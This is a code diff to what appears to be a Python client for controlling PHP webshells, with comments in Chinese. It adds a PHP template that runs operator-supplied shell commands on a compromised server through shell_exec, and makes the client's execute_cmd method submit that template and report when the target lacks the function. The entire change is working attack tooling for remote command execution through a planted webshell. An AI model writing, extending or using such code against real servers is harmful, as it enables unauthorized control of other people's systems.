@@ -66,6 +66,20 @@ try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}
 echo '{delimiter_stop}';"""
 )
 
+# TODO: 如果用户提供的命令打印了WRONG_NO_FUNCTION则这里的代码会将正常的输出
+# 当成是发生错误，需要修改输出的字符为随机字符
+
+EXECUTE_COMMAND_PHP = compress_phpcode_template(
+    """
+@session_write_close();
+if(!function_exists("shell_exec")) {
+    decoder_echo("WRONG_NO_FUNCTION");
+}else{
+    decoder_echo(shell_exec({cmd}));
+}
+"""
+)
+
 LIST_DIR_PHP = compress_phpcode_template(
     """
 error_reporting(0);
@@ -760,9 +774,12 @@ class PHPWebshellActions(PHPSessionInterface):
     async def execute_cmd(self, cmd: str) -> str:
         # 在执行长时间操作时会导致阻塞其他使用同一个PHPSESSID的操作
         # 所以需要关闭session来避免阻塞
-        return await self.submit(
-            f"@session_write_close(); decoder_echo(shell_exec({cmd!r}));"
+        result = await self.submit(
+            EXECUTE_COMMAND_PHP.replace("{cmd}", string_repr(cmd))
         )
+        if result == "WRONG_NO_FUNCTION":
+            raise exceptions.TargetError("目标不支持函数shell_exec")
+        return result
 
     async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
         dir_path = dir_path.removesuffix("/") + "/"
